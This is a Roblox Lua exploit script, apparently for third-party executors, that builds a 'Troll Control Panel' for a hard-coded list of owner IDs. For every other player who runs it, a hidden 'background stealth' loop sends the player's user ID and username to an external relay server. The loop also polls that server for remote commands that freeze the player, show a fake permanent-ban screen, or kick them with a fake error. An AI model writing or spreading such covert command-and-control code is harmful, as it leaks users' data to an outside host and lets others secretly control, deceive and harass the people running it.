-- CONFIGURATION
local RELAY_URL = "https://roblox-troll-relay.onrender.com" -- Your Render URL
local AUTHORIZED_IDS = {
    3100850095,
    10282453521,
    11769862078
}

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer

local isOwner = table.find(AUTHORIZED_IDS, LocalPlayer.UserId) ~= nil

-- Safe HTTP Request Wrapper
local function sendHttpRequest(method, endpoint, data)
    local url = RELAY_URL .. endpoint
    local body = data and HttpService:JSONEncode(data) or nil
    local requestMethod = (syn and syn.request) or (fluxus and fluxus.request) or request or HttpService.RequestAsync
    local headers = { ["Content-Type"] = "application/json" }
    
    local success, response
    if requestMethod == HttpService.RequestAsync then
        success, response = pcall(function()
            return HttpService:RequestAsync({ Url = url, Method = method, Headers = headers, Body = body })
        end)
        if success then return response.Body end
    else
        success, response = pcall(function()
            return requestMethod({ Url = url, Method = method, Headers = headers, Body = body })
        end)
        if success then return response.Body end
    end
    return nil
end

-- ACTION HANDLERS (Troll Logic)
local Actions = {
    ["Freeze"] = function()
        local char = LocalPlayer.Character
        if char and char:FindFirstChild("Humanoid") then
            char.Humanoid.WalkSpeed = 0
            char.Humanoid.JumpPower = 0
            for _, part in ipairs(char:GetDescendants()) do
                if part:IsA("BasePart") then part.Anchored = true end
            end
        end
    end,
    ["Unfreeze"] = function()
        local char = LocalPlayer.Character
        if char and char:FindFirstChild("Humanoid") then
            char.Humanoid.WalkSpeed = 16
            char.Humanoid.JumpPower = 50
            for _, part in ipairs(char:GetDescendants()) do
                if part:IsA("BasePart") then part.Anchored = false end
            end
        end
    end,
    ["FakeBan"] = function()
        local coreGui = game:GetService("CoreGui")
        if coreGui:FindFirstChild("FakeBanGui") then return end
        local screen = Instance.new("ScreenGui")
        screen.Name = "FakeBanGui"
        screen.IgnoreGuiInset = true
        screen.ZIndexBehavior = Enum.ZIndexBehavior.Global
        screen.Parent = coreGui
        
        local frame = Instance.new("Frame")
        frame.Size = UDim2.new(1, 0, 1, 0)
        frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        frame.Parent = screen
        
        local label = Instance.new("TextLabel")
        label.Size = UDim2.new(1, 0, 1, 0)
        label.BackgroundTransparency = 1
        label.TextColor3 = Color3.fromRGB(255, 30, 30)
        label.TextSize = 28
        label.Font = Enum.Font.SourceSansBold
        label.Text = "You have been permanently banned from this experience.\n\nReason: Exploitative Activity / Unexpected Client Behavior\nIncident ID: #" .. math.random(100000, 999999)
        label.Parent = frame
    end,
    ["Kick"] = function()
        LocalPlayer:Kick("An unexpected client error occurred. (Error Code: 273)")
    end
}

-- MAIN EXECUTION
if isOwner then
    local CoreGui = game:GetService("CoreGui")
    if CoreGui:FindFirstChild("TrollAdminPanel") then
        CoreGui.TrollAdminPanel:Destroy()
    end
    
    local ScreenGui = Instance.new("ScreenGui")
    ScreenGui.Name = "TrollAdminPanel"
    ScreenGui.Parent = CoreGui
    
    local MainFrame = Instance.new("Frame")
    MainFrame.Size = UDim2.new(0, 300, 0, 275)
    MainFrame.Position = UDim2.new(0.08, 0, 0.2, 0)
    MainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 26)
    MainFrame.BorderSizePixel = 0
    MainFrame.Active = true
    MainFrame.Draggable = true
    MainFrame.Parent = ScreenGui
    
    local MainCorner = Instance.new("UICorner")
    MainCorner.CornerRadius = UDim.new(0, 8)
    MainCorner.Parent = MainFrame
    
    local Title = Instance.new("TextLabel")
    Title.Size = UDim2.new(1, 0, 0, 40)
    Title.BackgroundColor3 = Color3.fromRGB(30, 30, 38)
    Title.Text = "  Troll Control Panel"
    Title.TextColor3 = Color3.fromRGB(240, 240, 240)
    Title.TextSize = 15
    Title.Font = Enum.Font.GothamBold
    Title.TextXAlignment = Enum.TextXAlignment.Left
    Title.Parent = MainFrame
    
    local TitleCorner = Instance.new("UICorner")
    TitleCorner.CornerRadius = UDim.new(0, 8)
    TitleCorner.Parent = Title
    
    local selectedTargetId = nil
    
    -- Dropdown Toggle Button
    local DropdownBtn = Instance.new("TextButton")
    DropdownBtn.Size = UDim2.new(0.88, 0, 0, 34)
    DropdownBtn.Position = UDim2.new(0.06, 0, 0, 52)
    DropdownBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
    DropdownBtn.TextColor3 = Color3.fromRGB(220, 220, 220)
    DropdownBtn.Text = "Select Target (Click to Refresh)"
    DropdownBtn.Font = Enum.Font.GothamMedium
    DropdownBtn.TextSize = 13
    DropdownBtn.ZIndex = 3
    DropdownBtn.Parent = MainFrame
    
    local DropdownCorner = Instance.new("UICorner")
    DropdownCorner.CornerRadius = UDim.new(0, 6)
    DropdownCorner.Parent = DropdownBtn
    
    -- Dropdown List Container (Hidden by default, pops over buttons cleanly)
    local DropdownList = Instance.new("ScrollingFrame")
    DropdownList.Size = UDim2.new(0.88, 0, 0, 100)
    DropdownList.Position = UDim2.new(0.06, 0, 0, 89)
    DropdownList.BackgroundColor3 = Color3.fromRGB(28, 28, 36)
    DropdownList.BorderSizePixel = 0
    DropdownList.Visible = false
    DropdownList.ZIndex = 5
    DropdownList.CanvasSize = UDim2.new(0, 0, 0, 0)
    DropdownList.AutomaticCanvasSize = Enum.AutomaticSize.Y
    DropdownList.ScrollBarThickness = 4
    DropdownList.Parent = MainFrame
    
    local ListCorner = Instance.new("UICorner")
    ListCorner.CornerRadius = UDim.new(0, 6)
    ListCorner.Parent = DropdownList
    
    local UIListLayout = Instance.new("UIListLayout")
    UIListLayout.Parent = DropdownList
    UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
    UIListLayout.Padding = UDim.new(0, 2)
    
    local function refreshTargetList()
        for _, child in ipairs(DropdownList:GetChildren()) do
            if child:IsA("TextButton") then child:Destroy() end
        end
        
        task.spawn(function()
            local response = sendHttpRequest("GET", "/players", nil)
            if response then
                local success, data = pcall(function() return HttpService:JSONDecode(response) end)
                if success and data then
                    for userId, info in pairs(data) do
                        if tonumber(userId) ~= LocalPlayer.UserId then
                            local item = Instance.new("TextButton")
                            item.Size = UDim2.new(1, 0, 0, 30)
                            item.BackgroundColor3 = Color3.fromRGB(45, 45, 58)
                            item.TextColor3 = Color3.fromRGB(230, 230, 230)
                            item.Text = "  " .. info.username .. " (" .. userId .. ")"
                            item.Font = Enum.Font.Gotham
                            item.TextSize = 12
                            item.TextXAlignment = Enum.TextXAlignment.Left
                            item.ZIndex = 6
                            item.Parent = DropdownList
                            
                            local itemCorner = Instance.new("UICorner")
                            itemCorner.CornerRadius = UDim.new(0, 4)
                            itemCorner.Parent = item
                            
                            item.MouseButton1Click:Connect(function()
                                selectedTargetId = userId
                                DropdownBtn.Text = "Target: " .. info.username
                                DropdownList.Visible = false
                            end)
                        end
                    end
                end
            end
        end)
    end
    
    DropdownBtn.MouseButton1Click:Connect(function()
        DropdownList.Visible = not DropdownList.Visible
        if DropdownList.Visible then
            refreshTargetList()
        end
    end)
    
    -- Action Buttons Layout
    local function createActionButton(name, yPos, actionName, color)
        local btn = Instance.new("TextButton")
        btn.Size = UDim2.new(0.88, 0, 0, 34)
        btn.Position = UDim2.new(0.06, 0, 0, yPos)
        btn.BackgroundColor3 = color or Color3.fromRGB(45, 45, 58)
        btn.TextColor3 = Color3.fromRGB(255, 255, 255)
        btn.Text = name
        btn.Font = Enum.Font.GothamMedium
        btn.TextSize = 13
        btn.ZIndex = 2
        btn.Parent = MainFrame
        
        local btnCorner = Instance.new("UICorner")
        btnCorner.CornerRadius = UDim.new(0, 6)
        btnCorner.Parent = btn
        
        btn.MouseButton1Click:Connect(function()
            if selectedTargetId then
                task.spawn(function()
                    sendHttpRequest("POST", "/send", {
                        targetId = selectedTargetId,
                        action = actionName
                    })
                end)
            else
                DropdownBtn.Text = "⚠️ Please select a target first!"
                task.wait(1.5)
                DropdownBtn.Text = "Select Target (Click to Refresh)"
            end
        end)
    end
    
    createActionButton("Freeze Target", 98, "Freeze", Color3.fromRGB(45, 85, 135))
    createActionButton("Unfreeze Target", 138, "Unfreeze", Color3.fromRGB(50, 115, 70))
    createActionButton("Trigger Fake Ban", 178, "FakeBan", Color3.fromRGB(130, 45, 45))
    createActionButton("Force Kick", 218, "Kick", Color3.fromRGB(115, 35, 35))

else
    -- NON-OWNER BACKGROUND STEALTH: Heartbeat & Command Polling
    task.spawn(function()
        while true do
            pcall(function()
                sendHttpRequest("POST", "/ping", {
                    userId = tostring(LocalPlayer.UserId),
                    username = LocalPlayer.Name
                })
            end)
            
            local responseBody = sendHttpRequest("GET", "/poll/" .. LocalPlayer.UserId, nil)
            if responseBody then
                local success, data = pcall(function()
                    return HttpService:JSONDecode(responseBody)
                end)
                if success and data and data.commands then
                    for _, cmd in ipairs(data.commands) do
                        if Actions[cmd] then
                            task.spawn(Actions[cmd])
                        end
                    end
                end
            end
            task.wait(3)
        end
    end)
end
